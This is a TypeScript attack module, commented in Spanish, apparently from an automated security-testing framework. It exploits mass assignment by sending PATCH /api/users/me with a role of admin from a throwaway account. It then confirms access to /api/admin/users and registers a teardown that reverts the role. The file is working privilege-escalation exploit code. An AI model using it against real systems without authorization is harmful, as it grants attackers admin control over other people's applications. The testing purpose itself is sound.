/**
 * Ataque real: mass assignment. PATCH /api/users/me arma el UPDATE con cualquier
 * columna de USER_COLUMNS, incluida `role`. Un usuario normal se auto-asciende a
 * admin. Lo probamos con una cuenta desechable y revertimos el rol al final.
 */
import { CATALOG } from '../catalog.ts';
import { reqLine } from '../../../core/http.ts';
import { me, registerThrowaway } from './session.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../../../core/types.ts';

export const massAssignment: Attack = {
  meta: CATALOG['mass-assignment'],
  mutating: true, // crea una cuenta y le escala el rol (revierte al final)
  async run(ctx: AttackContext): Promise<AttackResult> {
    const steps: AttackStep[] = [];

    const attacker = await registerThrowaway(ctx);
    const before = await me(ctx, attacker.token);
    steps.push({
      technique: 'Cuenta sin privilegios',
      request: reqLine('GET', '/api/users/me'),
      response_summary: `role inicial = "${before?.role}"`,
    });

    // El payload malicioso: inyectar role=admin en la actualización de perfil.
    const patch = await ctx.http.patch('/api/users/me', { name: 'rt', role: 'admin' }, { token: attacker.token });
    const after = patch.json as { role?: string };
    const escalated = patch.status === 200 && after?.role === 'admin';
    steps.push({
      technique: 'Mass assignment: inyección de campo role',
      mitre: ['T1068'],
      request: reqLine('PATCH', '/api/users/me'),
      response_summary: `HTTP ${patch.status} — role ahora = "${after?.role}"`,
      exchange: patch.exchange,
      note: escalated ? 'El body {role:"admin"} se aplicó al modelo: escalada de privilegios.' : undefined,
    });

    // Registra la reversión del rol en el teardown (robusto aunque falle lo que sigue).
    if (escalated) {
      ctx.tracker.add(`rol escalado de ${attacker.email} → revertir a user`, async () => {
        await ctx.http.patch('/api/users/me', { role: 'user' }, { token: attacker.token });
      });
    }

    // Prueba de impacto: ahora el endpoint solo-admin responde.
    let adminReachable = false;
    if (escalated) {
      const stats = await ctx.http.get('/api/admin/users', { token: attacker.token });
      adminReachable = stats.status === 200;
      steps.push({
        technique: 'Uso del rol escalado',
        mitre: ['T1078.003'],
        request: reqLine('GET', '/api/admin/users'),
        response_summary: `HTTP ${stats.status} — ${adminReachable ? 'acceso de admin concedido' : 'sin acceso'}`,
        exchange: stats.exchange,
      });
    }

    return {
      vuln_id: massAssignment.meta.id,
      confirmed: escalated,
      blocked: !escalated,
      steps,
      gained: escalated ? ['rol admin obtenido por auto-escalada', ...(adminReachable ? ['acceso al panel de admin'] : [])] : [],
      foothold: escalated ? { type: 'admin', detail: 'cuenta propia elevada a admin' } : undefined,
      attacker_active: false, // revertimos el rol tras la prueba
      summary: escalated
        ? 'Mass assignment confirmado: PATCH /api/users/me con {role:"admin"} escala a admin' +
          (adminReachable ? ' y habilita el panel /api/admin.' : '.')
        : 'El endpoint ignoró el campo role: no es explotable.',
    };
  },
};
